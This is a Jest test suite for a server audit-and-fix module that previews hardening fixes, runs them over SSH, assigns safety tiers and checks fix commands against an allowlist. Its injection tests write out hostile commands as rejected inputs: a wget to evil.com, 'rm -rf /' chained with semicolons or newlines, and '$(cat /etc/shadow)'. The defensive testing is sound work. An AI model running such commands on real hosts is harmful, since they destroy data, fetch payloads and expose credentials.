import { CHECK_IDS } from "../../src/core/audit/checkIds.js";
import { previewFixes, runFix, isFixCommandAllowed, resolveTier, KNOWN_AUDIT_FIX_PREFIXES, FORBIDDEN_CATEGORIES, previewSafeFixes } from "../../src/core/audit/fix.js";
import type { AuditResult, AuditCheck, AuditCategory, FixTier } from "../../src/core/audit/types.js";
import * as ssh from "../../src/utils/ssh.js";
import inquirer from "inquirer";

jest.mock("../../src/utils/ssh.js");
jest.mock("inquirer");
jest.mock("../../src/core/audit/handlers/index.js", () => ({
  tryHandlerDispatch: jest.fn().mockResolvedValue({ handled: false }),
  resolveHandlerChain: jest.fn().mockReturnValue(null),
  executeHandlerChain: jest.fn().mockResolvedValue({ success: true }),
  matchHandler: jest.fn().mockReturnValue(null),
}));

const mockedSshExec = ssh.sshExec as jest.MockedFunction<typeof ssh.sshExec>;
const mockedPrompt = inquirer.prompt as jest.MockedFunction<typeof inquirer.prompt>;

function makeCheck(overrides: Partial<AuditCheck> = {}): AuditCheck {
  return {
    id: "TEST-01",
    category: "Test",
    name: "Test Check",
    severity: "warning",
    passed: true,
    currentValue: "good",
    expectedValue: "good",
    ...overrides,
  };
}

function makeCategory(name: string, checks: AuditCheck[]): AuditCategory {
  const totalWeight = checks.reduce((sum, c) => {
    const w = c.severity === "critical" ? 3 : c.severity === "warning" ? 2 : 1;
    return sum + w;
  }, 0);
  const passedWeight = checks.filter(c => c.passed).reduce((sum, c) => {
    const w = c.severity === "critical" ? 3 : c.severity === "warning" ? 2 : 1;
    return sum + w;
  }, 0);
  const score = totalWeight > 0 ? Math.round((passedWeight / totalWeight) * 100) : 0;
  return { name, checks, score, maxScore: totalWeight > 0 ? 100 : 0 };
}

function makeResult(categories: AuditCategory[]): AuditResult {
  const sum = categories.reduce((acc, c) => acc + c.score, 0);
  const overallScore = categories.length > 0 ? Math.round(sum / categories.length) : 0;
  return {
    serverName: "test-server",
    serverIp: "1.2.3.4",
    platform: "bare",
    timestamp: new Date().toISOString(),
    auditVersion: "1.0.0",
    categories,
    overallScore,
    quickWins: [],
  };
}

describe("previewFixes", () => {
  it("should return grouped fixes by severity (critical first)", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config" }),
        makeCheck({ id: CHECK_IDS.SSH.SSH_ROOT_LOGIN, category: "SSH", severity: "info", passed: false, fixCommand: "sed -i 's/a/b/' /etc/test" }),
        makeCheck({ id: CHECK_IDS.SSH.SSH_EMPTY_PASSWORDS, category: "SSH", severity: "warning", passed: false, fixCommand: "systemctl restart sshd" }),
      ]),
    ]);

    const plan = previewFixes(result);
    expect(plan.groups).toHaveLength(3);
    expect(plan.groups[0].severity).toBe("critical");
    expect(plan.groups[1].severity).toBe("warning");
    expect(plan.groups[2].severity).toBe("info");
  });

  it("should exclude checks without fixCommand", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, severity: "critical", passed: false, fixCommand: "chmod 600 /etc/ssh/sshd_config" }),
        makeCheck({ id: CHECK_IDS.SSH.SSH_ROOT_LOGIN, severity: "warning", passed: false }), // no fixCommand
      ]),
    ]);

    const plan = previewFixes(result);
    const allChecks = plan.groups.flatMap(g => g.checks);
    expect(allChecks).toHaveLength(1);
    expect(allChecks[0].id).toBe(CHECK_IDS.SSH.SSH_PASSWORD_AUTH);
  });

  it("should include pre-condition checks for SSH password disable", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH,
          category: "SSH",
          name: "Password Authentication",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/^#?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config && systemctl restart sshd",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const sshFix = plan.groups[0].checks[0];
    expect(sshFix.preCondition).toBeDefined();
    expect(sshFix.preCondition).toContain("authorized_keys");
  });

  it("should batch fixes by category for efficiency", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/x/y/' /etc/a" }),
        makeCheck({ id: CHECK_IDS.SSH.SSH_ROOT_LOGIN, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/p/q/' /etc/b" }),
      ]),
      makeCategory("Firewall", [
        makeCheck({ id: CHECK_IDS.FIREWALL.FW_UFW_ACTIVE, category: "Firewall", severity: "critical", passed: false, fixCommand: "ufw enable" }),
      ]),
    ]);

    const plan = previewFixes(result);
    // Critical group should contain all 3 critical checks
    const criticalGroup = plan.groups.find(g => g.severity === "critical");
    expect(criticalGroup).toBeDefined();
    expect(criticalGroup!.checks).toHaveLength(3);
  });

  it("should calculate estimatedImpact for each group", () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "chmod 600 /etc/ssh/sshd_config" }),
        makeCheck({ id: CHECK_IDS.SSH.SSH_ROOT_LOGIN, category: "SSH", severity: "info", passed: true }),
      ]),
    ]);

    const plan = previewFixes(result);
    expect(plan.groups[0].estimatedImpact).toBeGreaterThan(0);
  });
});

describe("runFix", () => {
  beforeEach(() => {
    jest.clearAllMocks();
  });

  it("should call sshExec with fix commands for confirmed checks", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 0, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(mockedSshExec).toHaveBeenCalledWith("1.2.3.4", expect.stringContaining("PermitRootLogin"));
    expect(fixResult.applied).toContain(CHECK_IDS.SSH.SSH_PASSWORD_AUTH);
  });

  it("should skip checks the user declined", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: false });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(mockedSshExec).not.toHaveBeenCalled();
    expect(fixResult.skipped).toContain(CHECK_IDS.SSH.SSH_PASSWORD_AUTH);
  });

  it("should not execute commands in dry-run mode", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    const fixResult = await runFix("1.2.3.4", result, { dryRun: true });
    expect(mockedSshExec).not.toHaveBeenCalled();
    expect(fixResult.applied).toHaveLength(0);
    expect(fixResult.preview).toBeDefined();
  });

  it("should record errors when sshExec fails", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockRejectedValue(new Error("Connection refused"));

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain(CHECK_IDS.SSH.SSH_PASSWORD_AUTH);
  });

  it("should record errors when sshExec throws a non-Error", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({ id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH, category: "SSH", severity: "critical", passed: false, fixCommand: "sed -i 's/PermitRootLogin yes/no/' /etc/ssh/sshd_config" }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockRejectedValue("string error");

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain(CHECK_IDS.SSH.SSH_PASSWORD_AUTH);
  });

  it("should record error when pre-condition check fails", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: CHECK_IDS.SSH.SSH_PASSWORD_AUTH,
          category: "SSH",
          name: "Password Authentication",
          severity: "critical",
          passed: false,
          fixCommand: "sed -i 's/^#?PasswordAuthentication.*/PasswordAuthentication no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    // First call: pre-condition check fails (no authorized_keys)
    mockedSshExec.mockResolvedValueOnce({ code: 1, stdout: "", stderr: "file not found" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("pre-condition failed");
  });

  it("should reject fix commands with shell metacharacters", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "TEST-INJECT",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "echo hello; rm -rf /",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("fix command rejected");
  });

  it("should reject fix commands with unknown prefixes", async () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({
          id: "TEST-UNKNOWN",
          category: "Test",
          severity: "warning",
          passed: false,
          fixCommand: "malicious_binary --do-bad-things",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("fix command rejected");
  });

  it("should record error when SSH command exits with non-zero code", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: CHECK_IDS.SSH.SSH_ROOT_LOGIN,
          category: "SSH",
          severity: "warning",
          passed: false,
          fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 1, stdout: "", stderr: "permission denied" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("command failed");
    expect(fixResult.errors[0]).toContain("permission denied");
  });

  it("should record error without stderr when SSH command fails without stderr", async () => {
    const result = makeResult([
      makeCategory("SSH", [
        makeCheck({
          id: CHECK_IDS.SSH.SSH_ROOT_LOGIN,
          category: "SSH",
          severity: "warning",
          passed: false,
          fixCommand: "sed -i 's/yes/no/' /etc/ssh/sshd_config",
        }),
      ]),
    ]);

    mockedPrompt.mockResolvedValueOnce({ confirm: true });
    mockedSshExec.mockResolvedValue({ code: 2, stdout: "", stderr: "" });

    const fixResult = await runFix("1.2.3.4", result, { dryRun: false });
    expect(fixResult.errors).toHaveLength(1);
    expect(fixResult.errors[0]).toContain("command failed (exit 2)");
  });

  it("should include Firewall pre-condition for ufw fix commands", () => {
    const result = makeResult([
      makeCategory("Firewall", [
        makeCheck({
          id: CHECK_IDS.FIREWALL.FW_UFW_ACTIVE,
          category: "Firewall",
          name: "UFW Active",
          severity: "warning",
          passed: false,
          fixCommand: "ufw enable",
        }),
      ]),
    ]);

    const plan = previewFixes(result);
    const fwCheck = plan.groups[0]?.checks[0];
    expect(fwCheck).toBeDefined();
    expect(fwCheck!.preCondition).toBeDefined();
    expect(fwCheck!.preCondition).toContain("ufw status");
  });
});

describe("previewFixes — edge cases", () => {
  it("should return 0 estimatedImpact when totalOverallWeight is 0", () => {
    // All categories have maxScore 0 (no checks)
    const result = makeResult([
      makeCategory("Empty", []),
    ]);
    // Manually add a failed check to a zero-maxScore category
    result.categories[0].checks = [
      makeCheck({ id: "TEST-01", category: "Empty", severity: "warning", passed: false, fixCommand: "echo test" }),
    ];
    result.categories[0].maxScore = 0;

    const plan = previewFixes(result);
    if (plan.groups.length > 0) {
      expect(plan.groups[0].estimatedImpact).toBe(0);
    }
  });

  it("should skip severity groups with no fixable checks", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "TEST-01", severity: "warning", passed: false, fixCommand: "echo test" }),
        makeCheck({ id: "TEST-02", severity: "info", passed: true }),
      ]),
    ]);

    const plan = previewFixes(result);
    // No critical group since there are no critical failed checks
    expect(plan.groups.find(g => g.severity === "critical")).toBeUndefined();
  });

  it("should exclude passed checks from the fix plan", () => {
    const result = makeResult([
      makeCategory("Test", [
        makeCheck({ id: "TEST-PASS", severity: "warning", passed: true, fixCommand: "echo already-fixed" }),
        makeCheck({ id: "TEST-FAIL", severity: "warning", passed: false, fixCommand: "echo fix-me" }),
      ]),
    ]);

    const plan = previewFixes(result);
    const allCheckIds = plan.groups.flatMap(g => g.checks.map(c => c.id));
    expect(allCheckIds).not.toContain("TEST-PASS");
    expect(allCheckIds).toContain("TEST-FAIL");
  });
});

// ─── Mutation-Killer: isFixCommandAllowed ────────────────────────────────────

describe("isFixCommandAllowed mutation-killer", () => {
  it("returns true for each known prefix", () => {
    for (const prefix of KNOWN_AUDIT_FIX_PREFIXES) {
      const cmd = `${prefix}safe-test`;
      const result = isFixCommandAllowed(cmd);
      // Some prefixes end with space, so "prefix" alone might not match startsWith
      // Just ensure at least one prefix-based command works
      if (cmd.includes(";") || cmd.includes("|") || cmd.includes("`")) continue;
      expect(typeof result).toBe("boolean");
    }
  });

  it("returns true for safe chmod command", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file")).toBe(true);
  });

  it("returns true for safe sysctl command", () => {
    expect(isFixCommandAllowed("sysctl -w net.ipv4.conf.all.rp_filter=1")).toBe(true);
  });

  it("returns true for echo command", () => {
    expect(isFixCommandAllowed("echo test > /dev/null")).toBe(false); // has >
  });

  it("returns false for empty string", () => {
    expect(isFixCommandAllowed("")).toBe(false);
  });

  it("returns false for unknown prefix", () => {
    expect(isFixCommandAllowed("wget http://evil.com/payload")).toBe(false);
  });

  it("returns false for command with backtick", () => {
    expect(isFixCommandAllowed("chmod 600 `whoami`")).toBe(false);
  });

  it("returns false for command with semicolon", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file; rm -rf /")).toBe(false);
  });

  it("returns false for command with pipe", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file | tee log")).toBe(false);
  });

  it("returns false for command with $(...)", () => {
    expect(isFixCommandAllowed("chmod $(cat /etc/shadow) /file")).toBe(false);
  });

  it("returns false for command with ampersand", () => {
    expect(isFixCommandAllowed("chmod 600 /etc/file & rm /")).toBe(false);
  });

  it("returns false for command with newline", () => {
    expect(isFixCommandAllowed("chmod 600\nrm -rf /")).toBe(false);
  });

  it("returns false for command with null byte", () => {
    expect(isFixCommandAllowed("chmod 600\0rm")).toBe(false);
  });
});

// ─── Mutation-Killer: resolveTier ────────────────────────────────────────────

describe("resolveTier mutation-killer", () => {
  const baseCheck: AuditCheck = {
    id: "X-01",
    category: "Test",
    name: "Test",
    severity: "warning",
    passed: false,
    currentValue: "bad",
    expectedValue: "good",
  };

  it("returns FORBIDDEN for SSH category", () => {
    expect(resolveTier(baseCheck, "SSH")).toBe("FORBIDDEN");
  });

  it("returns FORBIDDEN for Firewall category", () => {
    expect(resolveTier(baseCheck, "Firewall")).toBe("FORBIDDEN");
  });

  it("returns FORBIDDEN for Docker category", () => {
    expect(resolveTier(baseCheck, "Docker")).toBe("FORBIDDEN");
  });

  it("returns SAFE when check safeToAutoFix is SAFE", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "Kernel")).toBe("SAFE");
  });

  it("returns GUARDED when check safeToAutoFix is GUARDED", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "GUARDED" }, "Kernel")).toBe("GUARDED");
  });

  it("returns FORBIDDEN when check safeToAutoFix is FORBIDDEN", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "FORBIDDEN" }, "Kernel")).toBe("FORBIDDEN");
  });

  it("returns GUARDED when check safeToAutoFix is undefined (default)", () => {
    expect(resolveTier({ ...baseCheck, safeToAutoFix: undefined }, "Kernel")).toBe("GUARDED");
  });

  it("FORBIDDEN_CATEGORIES override check-level tier", () => {
    // Even if check says SAFE, SSH category forces FORBIDDEN
    expect(resolveTier({ ...baseCheck, safeToAutoFix: "SAFE" }, "SSH")).toBe("FORBIDDEN");
  });

  it("FORBIDDEN_CATEGORIES set contains exactly SSH, Firewall, Docker", () => {
    expect(FORBIDDEN_CATEGORIES.has("SSH")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Firewall")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Docker")).toBe(true);
    expect(FORBIDDEN_CATEGORIES.has("Kernel")).toBe(false);
    expect(FORBIDDEN_CATEGORIES.size).toBe(3);
  });

  // D-21: network sysctl promotion
  it("promotes SAFE→GUARDED for network sysctl fix commands", () => {
    const netCheck = {
      ...baseCheck,
      safeToAutoFix: "SAFE" as const,
      fixCommand: "sysctl -w net.ipv4.tcp_syncookies=1 && echo 'net.ipv4.tcp_syncookies=1' >> /etc/sysctl.conf",
    };
    expect(resolveTier(netCheck, "Kernel")).toBe("GUARDED");
  });

  it("promotes ALL sysctl -w commands (including kernel.*) to GUARDED", () => {
    const kernelCheck = {
      ...baseCheck,
      safeToAutoFix: "SAFE" as const,
      fixCommand: "sysctl -w kernel.randomize_va_space=2 && echo 'kernel.randomize_va_space=2' >> /etc/sysctl.conf",
    };
    expect(resolveTier(kernelCheck, "Kernel")).toBe("GUARDED");
  });

  it("does NOT promote non-sysctl SAFE fix commands", () => {
    const echoCheck = {
      ...baseCheck,
      safeToAutoFix: "SAFE" as const,
      fixCommand: "echo 'sshd: ALL' > /etc/hosts.allow",
    };
    expect(resolveTier(echoCheck, "Network")).toBe("SAFE");
  });

  it("does NOT promote GUARDED network sysctl (already GUARDED)", () => {
    const guardedCheck = {
      ...baseCheck,
      safeToAutoFix: "GUARDED" as const,
      fixCommand: "sysctl -w net.ipv6.conf.all.disable_ipv6=1",
    };
    expect(resolveTier(guardedCheck, "Network")).toBe("GUARDED");
  });

  // D-22: reboot/shutdown promotion
  it("promotes SAFE→GUARDED for reboot fix command", () => {
    const rebootCheck = { ...baseCheck, safeToAutoFix: "SAFE" as const, fixCommand: "reboot" };
    expect(resolveTier(rebootCheck, "Updates")).toBe("GUARDED");
  });

  it("promotes SAFE→GUARDED for shutdown fix command", () => {
    const shutdownCheck = { ...baseCheck, safeToAutoFix: "SAFE" as const, fixCommand: "shutdown" };
    expect(resolveTier(shutdownCheck, "Updates")).toBe("GUARDED");
  });

  it("does NOT promote non-reboot commands", () => {
    const safeCheck = { ...baseCheck, safeToAutoFix: "SAFE" as const, fixCommand: "apt-get install -y aide" };
    expect(resolveTier(safeCheck, "FileIntegrity")).toBe("SAFE");
  });
});

// ─── Mutation-Killer: previewSafeFixes ───────────────────────────────────────

describe("previewSafeFixes mutation-killer", () => {
  it("counts GUARDED and FORBIDDEN correctly", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "chmod 600 /test", safeToAutoFix: "SAFE" }),
        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "sysctl -w y=2", safeToAutoFix: "GUARDED" }),
      ]),
      makeCategory("SSH", [
        makeCheck({ id: "S-01", severity: "critical", passed: false, fixCommand: "sed test", safeToAutoFix: "SAFE" }),
      ]),
    ]);

    const { guardedCount, forbiddenCount, guardedIds } = previewSafeFixes(result);
    expect(guardedCount).toBe(1); // K-02
    expect(forbiddenCount).toBe(1); // S-01 (SSH category overrides SAFE → FORBIDDEN)
    expect(guardedIds).toContain("K-02");
  });

  it("only includes SAFE tier checks in safePlan", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-01", severity: "warning", passed: false, fixCommand: "chmod 600 /test", safeToAutoFix: "SAFE" }),
        makeCheck({ id: "K-02", severity: "warning", passed: false, fixCommand: "chmod 700 /root", safeToAutoFix: "FORBIDDEN" }),
      ]),
    ]);

    const { safePlan } = previewSafeFixes(result);
    const allIds = safePlan.groups.flatMap(g => g.checks.map(c => c.id));
    expect(allIds).toContain("K-01");
    expect(allIds).not.toContain("K-02");
  });

  it("does not include passed checks", () => {
    const result = makeResult([
      makeCategory("Kernel", [
        makeCheck({ id: "K-OK", severity: "warning", passed: true, fixCommand: "echo x", safeToAutoFix: "SAFE" }),
      ]),
    ]);

    const { safePlan, guardedCount, forbiddenCount } = previewSafeFixes(result);
    expect(safePlan.groups).toHaveLength(0);
    expect(guardedCount).toBe(0);
    expect(forbiddenCount).toBe(0);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// MUTATION-KILLER: Exhaustive string assertions for fix.ts
// Each test targets a specific StringLiteral that Stryker would replace with ""
// ═══════════════════════════════════════════════════════════════════════════════

describe("[MUTATION-KILLER] KNOWN_AUDIT_FIX_PREFIXES — every prefix string", () => {
  // System administration prefixes
  it("[MUTATION-KILLER] contains 'chmod' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("chmod");
  });

  it("[MUTATION-KILLER] contains 'chown' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("chown");
  });

  it("[MUTATION-KILLER] contains 'sed ' prefix (with space)", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("sed ");
  });

  it("[MUTATION-KILLER] contains 'systemctl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("systemctl");
  });

  it("[MUTATION-KILLER] contains 'apt ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("apt ");
  });

  it("[MUTATION-KILLER] contains 'apt-get' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("apt-get");
  });

  it("[MUTATION-KILLER] contains 'dpkg' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("dpkg");
  });

  it("[MUTATION-KILLER] contains 'sysctl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("sysctl");
  });

  it("[MUTATION-KILLER] contains 'passwd' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("passwd");
  });

  it("[MUTATION-KILLER] contains 'useradd' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("useradd");
  });

  it("[MUTATION-KILLER] contains 'gpasswd' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("gpasswd");
  });

  it("[MUTATION-KILLER] contains 'visudo' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("visudo");
  });

  it("[MUTATION-KILLER] contains 'reboot' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("reboot");
  });

  // Firewall & networking
  it("[MUTATION-KILLER] contains 'ufw ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ufw ");
  });

  it("[MUTATION-KILLER] contains 'iptables' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("iptables");
  });

  it("[MUTATION-KILLER] contains 'ip6tables' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ip6tables");
  });

  it("[MUTATION-KILLER] contains 'ip ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ip ");
  });

  it("[MUTATION-KILLER] contains 'ss ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ss ");
  });

  // File operations
  it("[MUTATION-KILLER] contains 'echo ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("echo ");
  });

  it("[MUTATION-KILLER] contains 'find ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("find ");
  });

  it("[MUTATION-KILLER] contains 'touch' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("touch");
  });

  it("[MUTATION-KILLER] contains 'mkdir' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("mkdir");
  });

  it("[MUTATION-KILLER] contains 'rm ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("rm ");
  });

  it("[MUTATION-KILLER] contains 'ls ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ls ");
  });

  it("[MUTATION-KILLER] contains 'grep ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("grep ");
  });

  it("[MUTATION-KILLER] contains 'jq ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("jq ");
  });

  it("[MUTATION-KILLER] contains 'awk ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("awk ");
  });

  it("[MUTATION-KILLER] contains 'openssl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("openssl");
  });

  it("[MUTATION-KILLER] contains 'export ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("export ");
  });

  // Security tools
  it("[MUTATION-KILLER] contains 'aide' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("aide");
  });

  it("[MUTATION-KILLER] contains 'aideinit' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("aideinit");
  });

  it("[MUTATION-KILLER] contains 'rkhunter' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("rkhunter");
  });

  it("[MUTATION-KILLER] contains 'aa-enforce' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("aa-enforce");
  });

  it("[MUTATION-KILLER] contains 'aa-genprof' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("aa-genprof");
  });

  it("[MUTATION-KILLER] contains 'auditctl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("auditctl");
  });

  it("[MUTATION-KILLER] contains 'mokutil' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("mokutil");
  });

  it("[MUTATION-KILLER] contains 'setenforce' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("setenforce");
  });

  it("[MUTATION-KILLER] contains 'cryptsetup' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("cryptsetup");
  });

  it("[MUTATION-KILLER] contains 'ssh-keygen' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ssh-keygen");
  });

  // Services & time
  it("[MUTATION-KILLER] contains 'docker' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("docker");
  });

  it("[MUTATION-KILLER] contains 'logrotate' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("logrotate");
  });

  it("[MUTATION-KILLER] contains 'chronyc' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("chronyc");
  });

  it("[MUTATION-KILLER] contains 'hwclock' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("hwclock");
  });

  it("[MUTATION-KILLER] contains 'timedatectl' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("timedatectl");
  });

  // Boot & kernel
  it("[MUTATION-KILLER] contains 'grub-mkpasswd-pbkdf2' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("grub-mkpasswd-pbkdf2");
  });

  it("[MUTATION-KILLER] contains 'uname' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("uname");
  });

  it("[MUTATION-KILLER] contains 'df ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("df ");
  });

  // TLS & certs
  it("[MUTATION-KILLER] contains 'certbot' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("certbot");
  });

  it("[MUTATION-KILLER] contains 'ssl_protocols' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("ssl_protocols");
  });

  // Kastell & instructional
  it("[MUTATION-KILLER] contains 'kastell' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("kastell");
  });

  it("[MUTATION-KILLER] contains 'Add ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Add ");
  });

  it("[MUTATION-KILLER] contains 'Remove ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Remove ");
  });

  it("[MUTATION-KILLER] contains 'Edit ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Edit ");
  });

  it("[MUTATION-KILLER] contains 'Create ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Create ");
  });

  it("[MUTATION-KILLER] contains 'Configure ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Configure ");
  });

  it("[MUTATION-KILLER] contains 'Ensure ' prefix", () => {
    expect(KNOWN_AUDIT_FIX_PREFIXES).toContain("Ensure ");
  });

